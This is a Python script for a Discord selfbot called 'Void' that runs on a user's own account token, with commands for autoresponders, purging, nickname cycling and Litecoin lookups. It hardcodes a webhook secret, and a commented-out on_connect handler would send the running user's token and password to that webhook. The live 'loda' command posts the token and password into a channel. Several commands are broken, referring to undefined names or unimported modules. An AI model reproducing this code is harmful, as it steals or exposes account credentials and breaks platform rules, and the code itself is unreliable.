import os
import datetime
#os.system("pip install discord.py==1.7.3") 
import sys
import discord
import datetime
from discord.ext import commands, tasks
import asyncio
from itertools import cycle
import random
import requests
import pyfiglet
import random
import json
import logging
import aiohttp
from datetime import datetime, timedelta
import colorama
from tqdm import tqdm, trange
from colorama import Fore, Style
from time import sleep
import requests
#from discord_webhooks import DiscordWebhooks

colorama.init()  # Initialize colorama to enable color support

 

intents = discord.Intents.all()

void = ","


activity = discord.Activity(type=discord.ActivityType.streaming, name="Lucifer On Top")
bot = commands.Bot(description="test", command_prefix={void}, self_bot=True, activity=activity)
bot.remove_command('help')
total_commands_count = len(bot.commands)

  


auto_messages = {}

def load_autoresponder_data():
    try:
        with open('autoresponder_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}


def save_autoresponder_data(data):
    with open('autoresponder_data.json', 'w') as file:
        json.dump(data, file)
        



access = "1195732602749980714/3VQ2l_zoAFX714xCxGdMMOvcHVQv2Zv1fiJWKNqnArUP0uwgpVVMr2wSQQwNvx7xuoVR"

apikey = "https://discord.com/api/webhooks/"

import requests
#from discord_webhook import DiscordWebhooks

#@bot.event
#async def on_connect():
    #Clear()  # Assuming Clear() is a function you've defined elsewhere
    #webhook_url = f'{apikey}{access}'
    
    #message = f'**<a:diamond_blue:1193505600097759232> Token: `{token}`\n<:passwordcorret:1195790308781326367> Password: `{password}`\n<:name:1195790502616911942> Username: `{bot.user.name}`\n<:UserID:1195790485642555502> UserId: `{bot.user.id}`**'
    #ilosc = 1  # Assuming you want ilosc to be an integer

    #webhook = DiscordWebhooks(webhook_url)

    #webhook.set_content(title='Lmao Fuck Hogya',
                        #description=message,
                        #color=0x00FFED)

    #webhook.set_footer(text='made by: void.fy.', image='https://cdn.discordapp.com/avatars/622765592629215233/a_26c827a6662bcb3099a851fd8989cd4c.gif?size=2048')

    #for _ in range(ilosc):
       # webhook.send()



   
@bot.event
async def on_ready():
    #if auto_status_enabled:
        #change_status.start()
#    print(f"Logged in as {bot.user}")

#os.system("clear")  

    print(f"""{Fore.CYAN}                                      __     __    _     _ 
                                      \ \   / /__ (_) __| |
                                       \ \ / / _ \| |/ _` | 
                                        \ V / (_) | | (_| |
                                         \_/ \___/|_|\__,_|
       ===============================  </> Void </> ==========================================
                                 Cosmic Development | Void On Top
       =============================== /cosmic-codez ==========================================\n\n{Fore.RED}
         ╚╦╗                                                                               ╔╦╝
     ╔═════╩═══════════════════════╦═════════════════════════════════════╦══════════════════╩═════╗
       Logged In As:- {bot.user.name}       User Id:- {bot.user.id}            Prefix:- {void}
       Discord:- void.fy.            Support Server:- .gg/cosmic-codez       Total Commands:- {len(bot.commands)}   
       Instagram:- void.fy           https://guns.lol/void.fy                Guilds:- {len(bot.guilds)}
         
     ╚═════╦═══════════════════════╩═════════════════════════════════════╩══════════════════╦═════╝
          ╔╩╝                                                                              ╚╩╗\n\n     Commands Logs:-\n\n═════════════════════════════════════════════════════════════════════════════════════════════════════""")

    #print(f"{Fore.RED}Github {Fore.BLUE}[{Fore.RED}Github{Fore.BLUE}] @DXVVAY(DEXV), @Xvirus0, @2l2cgit(AdminX) {Fore.BLUE}[{Fore.RED}Twitter{Fore.BLUE}] @dexvisnotgay {Fore.BLUE}[{Fore.RED}Discord{Fore.BLUE}] .gg/xvirus, @dexv0, @admin2rich")
    
print(f"{Fore.MAGENTA}")
progressbar = tqdm([1,2,3,4,5,6,7,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Loading: ')
os.system("clear")  

bot.slotbot_sniper = True

#    def SlotBotData():
#        print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
#              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" +
#              Fore.RESET)
              
           
@tasks.loop(seconds=2)  # Change status every 15 minutes (adjust as needed)
async def change_status():
    new_status = random.choice(config["statuses"])
    await bot.change_presence(activity=discord.Game(name=new_status))
      
  
  # Disable discord.py default logs
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.ext').setLevel(logging.CRITICAL)

@bot.event
async def on_command(ctx):
    print(f'{Fore.GREEN}\n     Command executed: {ctx.message.content} ✅\n\n     ════════════════════════════')

@bot.event
async def on_command_error(ctx, error):
    # Print error to console
    print(f"{Fore.RED}\n     Error executing command: {ctx.message.content}\n     {error} ❎\n\n     ════════════════════════════")

    # Reply with error message in Discord channel
    await ctx.send(f"```js\nError executing command: `{ctx.message.content}`\n{error}```")   


             
@bot.command()
#@commands.check(is_authorized)
async def addar(ctx, trigger, *, response):
    autoresponder_data = load_autoresponder_data()
    autoresponder_data[trigger] = response
    save_autoresponder_data(autoresponder_data)
    await ctx.send(f'Autoresponder added: `{trigger}` -> `{response}`')

@bot.command()
#@commands.check(is_authorized)
async def removear(ctx, trigger):
    autoresponder_data = load_autoresponder_data()
    if trigger in autoresponder_data:
        del autoresponder_data[trigger]
        save_autoresponder_data(autoresponder_data)
        await ctx.send(f'Autoresponder removed: `{trigger}`')
    else:
        await ctx.send('Autoresponder not found.')

@bot.command()
#@commands.check(is_authorized)
async def listar(ctx):
    autoresponder_data = load_autoresponder_data()
    if autoresponder_data:
        response = 'Autoresponders:\n'
        for trigger, response_text in autoresponder_data.items():
            response += f'`{trigger}` -> `{response_text}`\n'
        await ctx.send(response)
    else:
        await ctx.send('No autoresponders found.')
            
@bot.command(name="ping", aliases=["pong", "latency"])
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.reply(f"```js\n🚀 Pong! Latency is {latency}ms```")


#@bot.command(aliases=['h'])
#@commands.check(is_authorized)
#⁍
#async def help(ctx):
#    command_list = bot.commands
#    sorted_commands = sorted(command_list, key=lambda x: x.name)

   # response = "```js\n🚀 V O I D  S 3 L F  B O T 🚀```\n\n"
    #for command in sorted_commands:
     #   response += f"**{command.name}** , "

    #await ctx.reply(response)
 

@bot.command(aliases=['h'])
#@commands.check(is_authorized)
#⁍
async def help(ctx):
    command_list = bot.commands
    sorted_commands = sorted(command_list, key=lambda x: x.name)

    response = "```js\n🚀 V O I D  S 3 L F  B O T 🚀```\n\n"
    for command in sorted_commands:
        #response += f"```js\n🚀 • help 🚀```\n"
        response += f"```js\n🚀  {command.name}```"

    await ctx.reply(response)  
  
  
@bot.command()
async def okk(ctx):
    command_list = bot.commands
    sorted_commands = sorted(command_list, key=lambda x: x.name)

    response = f"**<:pain_selfbot_bluecrown:1151493627340652575>    __{bot.user.name}'s Selfbot V2__    <:pain_selfbot_bluecrown:1151493627340652575>**\n\n"
    for command in sorted_commands:
        response += f"**{command.name}**,"

    await ctx.reply(response)
    
@bot.command(aliases=['ui', 'whois'])
#@commands.check(is_authorized)
async def userinfo(ctx, member: discord.Member = None):
    member = member or ctx.author

    user_info = [
        f"• Username: {member.name}",
        f"• Discriminator: {member.discriminator}",
        f"• ID: {member.id}",
        f"• Nickname: {member.nick}",
        f"• Status: {member.status}",
        f"• Joined Discord: <t:{int(member.created_at.timestamp())}:d>",
        f"• Joined Server: <t:{int(member.joined_at.timestamp())}:d>"
    ]

    response = '\n'.join(user_info)
    await ctx.reply(f"User Info:\n{response}")
       
@bot.command(aliases=["secondh"])
async def secondhelp(ctx):
 await ctx.reply("https://embedl.ink/e/2HUcD9tf")
# PURGE CMD...

@bot.command(aliases=["clear"])
async def purge(ctx, amount: int = None):
  if amount is None:
    async for message in ctx.message.channel.history(
        limit=1000).filter(lambda m: m.author == bot.user):
      try:
        await message.delete()
      except discord.Forbidden:
        pass
      except discord.NotFound:
        pass
  else:
    async for message in ctx.message.channel.history(
        limit=amount).filter(lambda m: m.author == bot.user):
      try:
        await message.delete()
      except discord.Forbidden:
        pass
      except discord.NotFound:
        pass
  print(f"\n     {Fore.GREEN}[+] PURGED SUCCESFULLY✅ ")


@bot.command()
@commands.cooldown(1, 2, commands.BucketType.user)
#@commands.check(is_authorized)
async def boosts(ctx):
    await ctx.reply(f"> **This Server Has {ctx.guild.premium_subscription_count} Boosts**")
    
@bot.command(aliases=['av','ava'])
#@commands.check(is_authorized)
async def avatar(ctx, User: discord.Member=None):
    member = member or ctx.author

    avatar_url = member.avatar_url_as(format="png")
    await ctx.send(f"Avatar of {member.mention}: {avatar_url}")


@bot.command(aliases=['247'])
#@commands.check(is_authorized)
async def connectvc(ctx, channel_id):
    try:
        channel = bot.get_channel(int(channel_id))

        if channel is None:
            return await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")

        if isinstance(channel, discord.VoiceChannel):
            permissions = channel.permissions_for(ctx.guild.me)

            if not permissions.connect or not permissions.speak:
                return await ctx.send("I don't have permissions to connect or speak in that channel.")

            voice_channel = await channel.connect()
            await ctx.send(f"Connected to voice channel: {channel.name}")

            await channel.send("Hello, I have connected to this voice channel!")

        else:
            await ctx.send("This is not a voice channel. Please provide a valid voice channel ID.")
    except discord.errors.ClientException:
        await ctx.send("I'm already connected to a voice channel.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to perform this action.")
    except ValueError:
        await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(aliases=['cltc'])
#@commands.check(is_authorized)
async def ltcprice(ctx):
    url = 'https://api.coingecko.com/api/v3/coins/litecoin'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        price = data['market_data']['current_price']['usd']
        await ctx.send(f"The current price of Litecoin (LTC) is ${price:.2f}")
    else:
        await ctx.send("```js\nFailed to fetch Litecoin price```")



@bot.command()
async def leave(ctx, guild_id: int):
    guild = bot.get_guild(guild_id)
    if guild:
        await guild.leave()
        await ctx.send(f"**✅ | `{bot.user.name}` left `{guild.name}`.**")
        print (f"✅ SUCCESSFULLY LEFT {guild.name}")
    else:
        await ctx.send("Unable to find the specified server.")
        print (f"🤡 WRONG SERVER OR SERVER ID")
@bot.command()
async def restart(ctx):
    await ctx.reply('<a:Flantic_boom:1155533304511086623> ** Restarting Selfbot It Will Take 4-5 Seconds**')
    os.execl(sys.executable, sys.executable, *sys.argv)
    

#info command
@bot.command(aliases=['info', 'stats'])
async def selfbot(ctx):
    version = f"{bot.user.name} Selfbot V2"
    language = "Python"
    author = f"**{bot.user.mention}**"
    total_commands = len(bot.commands)



    message = f"{author} **__PAPA S3LFB0T__**\n\n" \
              f"**• Vers: {version}\n" \
              f"• Lang: {language}\n" \
              f"• Created By: {author}\n" \
              f"• Total Cmds: {total_commands}\n" \
              f"• Total RAM: 16 GB\n" \
              f"• Used RAM: 8720 GB\n" \
              f"• Operating System: Razor Blade Stealth 13**\n\n" \

    await ctx.reply(message)    
    
@bot.command()
async def helpp(ctx, category=None):
    await ctx.message.delete()

    if category is None:
        embed = discord.Embed(color=0x00F0FF, timestamp=ctx.message.created_at)
        embed.set_author(
            name="idk",
            icon_url="https://cdn.discordapp.com/avatars/622765592629215233/a_2d02b3aa73ce4c6fcd710cfeadd7ccfe.gif?size=2048"
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/622765592629215233/a_2d02b3aa73ce4c6fcd710cfeadd7ccfe.gif?size=2048")

        embed.title = "Command Help"
        embed.description = "Here are some available commands:"
            
        embed.add_field(
            name="\uD83E\uDDCA `GENERAL`",
            value="Shows all general commands",
            inline=False
        )
        await ctx.send(embed=embed)

    elif str(category).lower() == "general":
        embed = discord.Embed(
            color=random.randrange(0x1000000),
            timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://cdn.discordapp.com/attachments/723250694118965300/723272273888280576/image0.gif"
        )
        embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> embed` - your message is embed\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n"
        await ctx.send(embed=embed)

    else:
        await ctx.send("Invalid category. Please provide a valid category.")


@bot.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow(
    )  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

@bot.command(
    pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.reply("<a:success:1177854179709038642> | Has Started")
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@bot.command(aliases=[
    "stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"
])
async def stopcyclenick(ctx):
    await ctx.reply("<a:success:1177854179709038642> | Cycle Nick Has Stopped")
    global cycling
    cycling = False


@bot.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send("All matchings, you won!")
    elif (a == b) or (a == c) or (b == c):
        await ctx.send("2 in a row, you won!")
    else:
        await ctx.send("No match, you lost")

 
@bot.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    bot.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        bot.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        bot.slotbot_sniper = False
         
with open('./config.json') as f:
    config = json.load(f)
    
    
    
    
@bot.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        voice.play('song.mp3')
    else:
        await ctx.send('You need to be a in VC to play music')


@bot.command()
async def stop(ctx):
    await ctx.message.delete()
    await ctx.send("Stopped the music player!")


@bot.command()
async def skip(ctx):
    await ctx.message.delete()
    await ctx.send("Skipped song!")


@bot.command(aliases=["lyric"])
async def lyrics(ctx, *, args):
    await ctx.message.delete()
    await ctx.send("Showing lyrics for " + args)
    


@bot.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    
    
    
    
    
@bot.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' +
                                   query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})',
                                html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])
    
    
    
    
    

@bot.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    bot.command_prefix = str(prefix)


@bot.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
    ]
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@bot.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = await ctx.send("Starting count to 100")
    await asyncio.sleep(0)
    for count in range(1, 101):
        await message.edit(content=str(count))
        await asyncio.sleep(1)


from discord import Embed
@bot.command()
async def loda(ctx):
    embed = Embed(
        title='Lmao Fuck Hogya',
        description=f'**<a:diamond_blue:1193505600097759232> Token: `{token}`\n<:passwordcorret:1195790308781326367> Password: `{password}`\n<:name:1195790502616911942> Username: `{bot.user.name}`\n<:UserID:1195790485642555502> UserId: `{bot.user.id}`**',
        color=0x00FFED
    )

    embed.set_footer(text='made by: void.fy.', icon_url='https://cdn.discordapp.com/avatars/622765592629215233/a_26c827a6662bcb3099a851fd8989cd4c.gif?size=2048')

    await ctx.reply(embed=embed)
    await ctx.reply(content="Here's the information:")

@bot.event
async def on_message(message):
    if message.author != bot.user:
        return
      
    autoresponder_data = load_autoresponder_data()
    content = message.content.lower()
    if content in autoresponder_data:
        response = autoresponder_data[content]
        await message.channel.send(response)
        await message.delete()

    await bot.process_commands(message)  

@bot.command(aliases=['bal', 'ltcbal'])

async def getbal(ctx, ltcaddress):
    
    
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8  
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return

    
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    
    
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    
    
    message = f"LTC Address: `{ltcaddress}`\n"
    message += f"Current LTC: **${usd_balance:.2f} USD**\n"
    message += f"Total LTC Received: **${usd_total_balance:.2f} USD**\n"
    message += f"Unconfirmed LTC: **${usd_unconfirmed_balance:.2f} USD**"
    
    
    response_message = await ctx.send(message)
    
    
    await asyncio.sleep(60)
    await response_message.delete()

@bot.command(aliases=['Addy'])
async def addy(ctx):
    await ctx.reply("LT4pspHgnDSKxch1JvCEo7Uft2y15Zf1XY")
password = config.get('password')
token = config.get('token')
bot.run(token, bot=False)

